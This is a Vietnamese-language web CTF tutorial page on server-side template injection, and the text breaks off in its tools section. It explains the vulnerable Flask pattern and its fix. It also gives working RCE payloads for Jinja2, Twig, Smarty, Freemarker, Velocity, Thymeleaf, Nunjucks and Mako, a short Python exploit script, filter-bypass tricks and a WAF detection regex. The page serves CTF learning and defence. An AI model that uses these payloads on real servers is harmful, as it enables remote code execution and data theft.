@@ -1,0 +1,621 @@
+<title>Server-Side Template Injection (SSTI) — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Injection phía server</div>
+    <h1>Server-Side Template Injection (SSTI)</h1>
+    <p class="sub">Khi trang web dùng "template" (khuôn mẫu HTML có chỗ trống để điền dữ liệu) và lỡ coi
+    <strong>dữ liệu bạn gõ vào</strong> như một phần của chính khuôn mẫu đó — bạn có thể viết code vào chỗ lẽ ra
+    chỉ là text, và server sẽ "biên dịch" code đó, có thể dẫn tới chạy lệnh tùy ý trên máy chủ.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload theo engine</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>SSTI là gì, để làm gì?</h2>
+  <p class="lead">Nhiều framework web (Flask, Django, Spring...) dùng <strong>template engine</strong> để dựng
+  trang HTML: viết sẵn một "khuôn" với chỗ trống <code>{{ }}</code>, rồi điền dữ liệu thật vào chỗ trống đó lúc
+  chạy. Nếu server lỡ lấy <strong>chữ bạn gõ</strong> ghép thẳng vào chính cái khuôn (thay vì chỉ điền vào chỗ
+  trống), template engine sẽ coi chữ bạn gõ là <strong>một phần của khuôn</strong> — và "biên dịch" (compile) nó
+  như code thật. Với nhiều engine, từ đó leo thang được tới chạy lệnh hệ thống tùy ý.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Dấu hiệu nhận biết kinh điển: gõ <code>{{7*7}}</code> vào ô input, nếu trang hiện ra số <strong>49</strong>
+  (thay vì in nguyên văn <code>{{7*7}}</code>) — nghĩa là server đã <em>tính toán</em> chữ bạn gõ như code, không
+  chỉ hiển thị như text. Đó chính là SSTI.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ SERVER-SIDE TEMPLATE INJECTION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Gõ <code>{{7*7}}</code> vào ô input bất kỳ (tên, bio, tìm kiếm...) → trang hiện <code>49</code> thay vì
+        <code>{{7*7}}</code> ⟹ chắc chắn SSTI. Thử thêm <code>${7*7}</code>, <code>#{7*7}</code>,
+        <code>&lt;%= 7*7 %&gt;</code> nếu cú pháp <code>{{ }}</code> không ăn (engine khác).
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Input của bạn được đưa thẳng vào template string (không phải chỉ vào biến dữ liệu). Biết được server
+        chạy ngôn ngữ/framework nào (xem header <code>Server</code>, cookie, trang lỗi — xem bài recon).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò engine bằng Burp</span>
+        Repeater, gửi lần lượt payload dò ở mục 04. Payload nào ra kết quả đúng công thức toán học (hoặc ra lỗi
+        đặc trưng) sẽ lộ chính xác engine đang chạy.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (Jinja2/Flask — hay gặp nhất)</span>
+<pre><code><span class="c"># 1. Xác nhận SSTI</span>
+{{7*7}}
+<span class="c"># 2. Xác nhận đúng Jinja2 (không phải Twig)</span>
+{{7*'7'}}        <span class="c"># Jinja2 -> 7777777 | Twig -> 49</span>
+<span class="c"># 3. RCE — đọc flag</span>
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
+<span class="c"># 3b. Bản ngắn hơn, hay dùng khi payload dài bị lọc</span>
+{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+html = requests.post(<span class="s">"http://TARGET/greet"</span>,
+        data={<span class="s">"name"</span>: <span class="s">"{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Payload dài bị chặn → tìm biến toàn cục ngắn hơn (<code>cycler</code>, <code>lipsum</code>,
+        <code>joiner</code>, <code>namespace</code> đều có sẵn trong Jinja2 mặc định, không cần tự import).
+        Server chặn chữ <code>os</code>/<code>import</code> → dùng chuỗi ghép (mục 06). WAF rule nhanh: chặn
+        regex <code>\{\{.*(__class__|__globals__|__mro__|__import__|popen|system).*\}\}</code>. Chưa hiểu các
+        bước? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Template (khuôn mẫu)</b> — một file HTML có sẵn "chỗ trống" để điền dữ liệu, ví dụ:
+  <code>&lt;h1&gt;Xin chào, {{ ten }}!&lt;/h1&gt;</code>. Khi chạy, server thay <code>{{ ten }}</code> bằng giá trị
+  thật (vd "Nam") để ra <code>&lt;h1&gt;Xin chào, Nam!&lt;/h1&gt;</code>.</div>
+  <div class="def"><b>Template engine</b> — chương trình đọc file template, tìm các chỗ <code>{{ }}</code>, và
+  "biên dịch" (compile) những gì bên trong như một đoạn <strong>code thật</strong> của ngôn ngữ đó (không chỉ thay
+  chuỗi đơn giản) — ví dụ Jinja2 (Python/Flask) cho phép viết cả phép tính, gọi hàm, truy cập thuộc tính object bên
+  trong <code>{{ }}</code>.</div>
+  <div class="def"><b>RCE (Remote Code Execution)</b> — chạy được lệnh hệ thống tùy ý từ xa. Vì template engine
+  vốn được phép chạy code Python/Java/PHP thật bên trong <code>{{ }}</code>, nếu kiểm soát được nội dung đó, ta
+  kiểm soát luôn code chạy trên server.</div>
+  <p>Ví dụ: trang web có chức năng chào hỏi theo tên, code phía sau (kiểu hay gặp trong challenge) ghép input
+  thẳng vào chuỗi template <strong>trước khi</strong> đưa cho engine xử lý:</p>
+  <pre><code><span class="c"># Python/Flask</span>
+name = request.args.get(<span class="s">"name"</span>)
+<span class="k">return</span> render_template_string(<span class="s">f"&lt;h1&gt;Xin chào, {name}!&lt;/h1&gt;"</span>)</code></pre>
+  <p>Cách làm <strong>đúng</strong> (an toàn) là truyền <code>name</code> như một <strong>biến dữ liệu</strong>
+  cho template cố định sẵn (<code>render_template_string("Xin chào, {{ name }}!", name=name)</code>) — lúc đó
+  <code>name</code> chỉ được <em>thay thế</em>, không bao giờ được <em>biên dịch</em>. Challenge CTF thường cố ý
+  viết sai như ví dụ trên để tạo lỗ hổng.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Template string không phân biệt được "dữ liệu" với "code của khuôn"</h2>
+  <p>Khi dòng code <code>f"&lt;h1&gt;Xin chào, {name}!&lt;/h1&gt;"</code> chạy, Python ghép <code>name</code>
+  (giả sử bạn gửi <code>{{7*7}}</code>) vào, ra chuỗi:</p>
+  <pre><code>&lt;h1&gt;Xin chào, {{7*7}}!&lt;/h1&gt;</code></pre>
+  <p>Chuỗi HTML này <strong>sau đó</strong> mới được đưa cho Jinja2 xử lý qua
+  <code>render_template_string()</code>. Jinja2 không hề biết <code>{{7*7}}</code> này vốn là dữ liệu người dùng
+  gửi — với nó, <strong>mọi</strong> <code>{{ }}</code> trong chuỗi đều là chỗ cần tính toán/biên dịch. Nó thấy
+  <code>{{7*7}}</code>, hiểu đó là phép nhân, tính ra <code>49</code>, rồi thay vào. Kết quả trang hiện
+  "Xin chào, 49!".</p>
+  <p>Vì Jinja2 cho phép bên trong <code>{{ }}</code> không chỉ phép tính mà còn <strong>truy cập thuộc tính
+  Python</strong> (như <code>object.__class__</code>) và <strong>gọi hàm</strong>, nếu bạn viết đúng chuỗi, bạn có
+  thể "đi" từ một con số vô hại tới tận object <code>os</code> của Python và gọi <code>os.popen()</code> — y hệt
+  việc viết code Python thật.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Từ 7*7 tới RCE: "đi bộ" qua object Python</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr3)}
+    </style>
+    <defs><marker id="arr3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+
+    <rect x="10" y="20" width="150" height="50" rx="10" class="box"/>
+    <text x="20" y="40" class="lbl-m">Bắt đầu từ 1</text>
+    <text x="20" y="55" class="lbl-a">''.__class__</text>
+
+    <path d="M160,45 H195" class="arrow"/>
+    <rect x="200" y="20" width="150" height="50" rx="10" class="box"/>
+    <text x="210" y="40" class="lbl-m">Lớp của chuỗi:</text>
+    <text x="210" y="55" class="lbl-a">&lt;class 'str'&gt;</text>
+
+    <path d="M350,45 H385" class="arrow"/>
+    <rect x="390" y="20" width="150" height="50" rx="10" class="box"/>
+    <text x="400" y="40" class="lbl-m">.__mro__[1]:</text>
+    <text x="400" y="55" class="lbl-a">&lt;class 'object'&gt;</text>
+
+    <path d="M465,70 V100" class="arrow"/>
+    <rect x="390" y="105" width="150" height="50" rx="10" class="box"/>
+    <text x="400" y="125" class="lbl-m">.__subclasses__()</text>
+    <text x="400" y="140" class="lbl-a" font-size="9">[toàn bộ class đã load]</text>
+
+    <path d="M390,130 H230" class="arrow"/>
+    <rect x="70" y="105" width="150" height="50" rx="10" class="box-a"/>
+    <text x="80" y="125" class="lbl-m">tìm class chứa</text>
+    <text x="80" y="140" class="lbl-a">subprocess.Popen</text>
+
+    <path d="M145,155 V185" class="arrow"/>
+    <rect x="10" y="190" width="300" height="35" rx="10" class="box-a"/>
+    <text x="22" y="212" class="lbl-a">gọi Popen('cat flag.txt') -> RCE!</text>
+  </svg>
+  </div>
+  <p>Giải thích từng mảnh của payload (ví dụ Jinja2):</p>
+  <div class="pbreak">
+    <div class="ph">{{ ''.__class__.__mro__[1].__subclasses__() }}</div>
+    <div class="pb">
+      <div class="part"><code>''</code> — một chuỗi rỗng bất kỳ, chỉ dùng làm "bàn đạp" để lấy kiểu dữ liệu
+      <code>str</code> (có thể thay bằng bất kỳ giá trị nào luôn tồn tại trong template, như số <code>7</code>).</div>
+      <div class="part"><code>.__class__</code> — thuộc tính có trên <strong>mọi</strong> object Python, cho biết
+      object đó thuộc lớp (class) nào. <code>''.__class__</code> là <code>&lt;class 'str'&gt;</code>.</div>
+      <div class="part"><code>.__mro__</code> — danh sách các lớp cha mà <code>str</code> kế thừa (Method
+      Resolution Order). Phần tử <code>[1]</code> luôn là lớp <code>object</code> — lớp gốc của <strong>mọi</strong>
+      class trong Python.</div>
+      <div class="part"><code>.__subclasses__()</code> — gọi trên <code>object</code> sẽ liệt kê <strong>mọi
+      lớp con đã được nạp vào bộ nhớ</strong> của chương trình — trong đó có rất nhiều lớp hữu ích như
+      <code>subprocess.Popen</code>, <code>os._wrap_close</code>.</div>
+    </div>
+    <div class="resp"><b>Response mong đợi:</b> một danh sách rất dài các class, dạng
+    <code>[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, ..., &lt;class 'subprocess.Popen'&gt;, ...]</code> —
+    bạn cần đếm vị trí (index) của <code>subprocess.Popen</code> trong danh sách đó để dùng ở bước tiếp theo.</div>
+  </div>
+  <p>Bước tiếp theo — gọi thẳng class đó với lệnh muốn chạy (giả sử tìm được nó ở index <code>396</code>, số này
+  <strong>khác nhau tùy phiên bản Python/thư viện đã load</strong>, phải tự đếm lại mỗi lần):</p>
+  <pre><code>{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt', shell=True, stdout=-1).communicate() }}</code></pre>
+  <div class="note warn"><span class="tag">Thành thật về giới hạn</span>Chỉ số <code>[396]</code> KHÔNG cố định —
+  nó phụ thuộc bản Python, các thư viện đã import trong app đó. Luôn phải tự dò lại bằng cách in danh sách
+  <code>__subclasses__()</code> ra trước rồi đếm, hoặc dùng payload ngắn hơn ở mục 06 (qua <code>cycler</code>/
+  <code>lipsum</code>) để khỏi phải đếm index.</div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN & XÁC ĐỊNH ENGINE</div>
+  <h2>Payload dò — vừa xác nhận SSTI vừa biết engine nào</h2>
+  <table>
+    <tr><th>Payload dò</th><th>Kết quả nếu dính + engine</th></tr>
+    <tr><td><code>{{7*7}}</code></td><td>Ra <code>49</code> → Jinja2 (Python) hoặc Twig (PHP) — cần thử tiếp để phân biệt</td></tr>
+    <tr><td><code>{{7*'7'}}</code></td><td>Ra <code>7777777</code> → <strong>Jinja2</strong> (Python nhân chuỗi lặp lại). Ra <code>49</code> hoặc lỗi → <strong>Twig</strong></td></tr>
+    <tr><td><code>${7*7}</code></td><td>Ra <code>49</code> → Freemarker (Java) hoặc một số engine EL khác</td></tr>
+    <tr><td><code>#{7*7}</code></td><td>Ra <code>49</code> → một số engine Ruby/JSP dùng cú pháp này</td></tr>
+    <tr><td><code>&lt;%= 7*7 %&gt;</code></td><td>Ra <code>49</code> → ERB (Ruby), EJS (Node)</td></tr>
+    <tr><td><code>{system('id')}</code></td><td>Có output lệnh <code>id</code> → Smarty (PHP) cho phép gọi hàm trực tiếp kiểu này</td></tr>
+  </table>
+  <div class="note"><span class="tag">Mẹo</span>Kết hợp với header <code>Server</code>/cookie đã xem ở bài recon:
+  thấy cookie <code>session</code> kiểu Flask → ưu tiên thử Jinja2 trước; thấy <code>JSESSIONID</code> → ưu tiên
+  Freemarker/Thymeleaf/Velocity (Java).</div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1 — bắt request, thử payload dò</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp Proxy bật Intercept, dùng chức năng (form nhập tên/bio/comment) với giá trị thường.</li>
+    <li>Chuột phải request → <strong>Send to Repeater</strong>.</li>
+    <li>Sửa giá trị tham số thành <code>{{7*7}}</code>, Send, đọc Response: thấy <code>49</code> xuất hiện đúng
+    vị trí tên bạn gõ ⟹ xác nhận SSTI.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Bước 2 — leo thang dần, không nhảy thẳng payload dài</span>
+  <ol style="margin:4px 0 0">
+    <li>Thử <code>{{7*'7'}}</code> để xác định chính xác Jinja2 hay Twig.</li>
+    <li>Thử <code>{{ ''.__class__ }}</code> — nếu Response hiện <code>&lt;class 'str'&gt;</code>, bạn biết chuỗi
+    <code>__class__</code> không bị lọc, có thể đi tiếp.</li>
+    <li>Thử <code>{{ ''.__class__.__mro__ }}</code>, rồi <code>.__subclasses__()</code> — mỗi bước <strong>Send
+    và đọc kỹ Response</strong> trước khi thêm bước tiếp, để biết chính xác chỗ nào bị chặn nếu có lỗi.</li>
+  </ol>
+  <strong>Vì sao làm từng bước:</strong> payload RCE đầy đủ rất dài, nếu 1 ký tự bị lọc/sai mà bạn gửi nguyên cục,
+  bạn không biết lỗi nằm ở đâu. Build dần trong Repeater giúp cô lập đúng chỗ hỏng.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO ENGINE</div>
+  <h2>Mỗi engine một cách "leo" khác nhau</h2>
+
+  <h3>Jinja2 (Python/Flask) <span class="badge easy">hay gặp nhất ở CTF sinh viên</span></h3>
+  <table>
+    <tr><th>Mục đích</th><th>Payload</th></tr>
+    <tr><td>Đọc biến cấu hình (hay lộ SECRET_KEY)</td><td><code>{{ config }}</code></td></tr>
+    <tr><td>Xem object request hiện tại</td><td><code>{{ self }}</code></td></tr>
+    <tr><td>RCE qua subclasses (đầy đủ, cần tự đếm index)</td><td><code>{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate() }}</code></td></tr>
+    <tr><td>RCE ngắn hơn, KHÔNG cần đếm index (ưu tiên dùng)</td><td><code>{{ cycler.__init__.__globals__.os.popen('id').read() }}</code></td></tr>
+    <tr><td>Biến thể khác nếu <code>cycler</code> bị chặn</td><td><code>{{ lipsum.__globals__.os.popen('id').read() }}</code> hoặc <code>{{ joiner.__init__.__globals__.os.popen('id').read() }}</code></td></tr>
+    <tr><td>Nếu chữ <code>os</code> bị lọc theo blacklist từ khóa</td><td><code>{{ cycler.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}</code></td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Vì sao ưu tiên <code>cycler</code>/<code>lipsum</code></span>Đây là các
+  object <strong>có sẵn mặc định</strong> trong mọi template Jinja2 (dùng cho vòng lặp/text giả), không cần
+  "đi bộ" qua <code>__class__.__mro__.__subclasses__()</code> dài dòng và phải đếm index dễ sai. Luôn thử
+  nhóm này trước.</div>
+
+  <h3>Twig (PHP)</h3>
+  <table>
+    <tr><th>Mục đích</th><th>Payload</th></tr>
+    <tr><td>RCE (bản cũ)</td><td><code>{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}</code></td></tr>
+    <tr><td>RCE (bản mới hơn)</td><td><code>{{['id']|filter('system')}}</code></td></tr>
+  </table>
+
+  <h3>Smarty (PHP)</h3>
+  <table>
+    <tr><td>RCE trực tiếp</td><td><code>{system('id')}</code></td></tr>
+    <tr><td>Chạy cả khối PHP</td><td><code>{php}echo `id`;{/php}</code></td></tr>
+  </table>
+
+  <h3>Freemarker / Velocity (Java)</h3>
+  <table>
+    <tr><td>Freemarker RCE</td><td><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</code></td></tr>
+    <tr><td>Velocity RCE</td><td><code>#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")</code></td></tr>
+  </table>
+
+  <h3>Thymeleaf (Java)</h3>
+  <table>
+    <tr><td>RCE qua SpEL</td><td><code>[[${T(java.lang.Runtime).getRuntime().exec('id')}]]</code></td></tr>
+  </table>
+
+  <h3>EJS / Nunjucks / Handlebars / Pug (Node.js)</h3>
+  <table>
+    <tr><td>Nunjucks RCE</td><td><code>{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}</code></td></tr>
+    <tr><td>EJS (qua option bị poison, hiếm hơn)</td><td>xem bài riêng về prototype pollution — EJS thường cần kết hợp</td></tr>
+  </table>
+
+  <h3>Mako (Python)</h3>
+  <table>
+    <tr><td>RCE trực tiếp</td><td><code>${__import__('os').popen('id').read()}</code></td></tr>
+  </table>
+
+  <h3>Vượt bộ lọc cơ bản</h3>
+  <table>
+    <tr><th>Bộ lọc gặp phải</th><th>Cách né</th></tr>
+    <tr><td>Chặn khoảng trắng</td><td>Dùng <code>{{%set%a=...%}}</code> kiểu tag hoặc nối bằng <code>|attr()</code> filter thay vì dấu chấm</td></tr>
+    <tr><td>Blacklist chữ <code>os</code>/<code>import</code>/<code>class</code></td><td>Dùng chuỗi con + nối: <code>request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")</code> (mã hex thay cho <code>__</code>), hoặc ghép chuỗi <code>'\x5f\x5fclass\x5f\x5f'</code></td></tr>
+    <tr><td>Chặn dấu ngoặc nhọn <code>{{ }}</code></td><td>Một số nơi app tự thêm <code>{% %}</code> cho statement — thử <code>{% print(...) %}</code> thay vì <code>{{ }}</code></td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: TPLMAP, CYBERCHEF &amp; KHO PAYLOAD</div>
+  <h2>Không nhớ nổi payload theo từng engine? Dùng công cụ</h2>
+
+  <h3>A. Kho payload offline — PayloadsAllTheThings</h3>
+  <p>Tại <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Server Side Template Injection/</code> — chia theo ngôn ngữ:
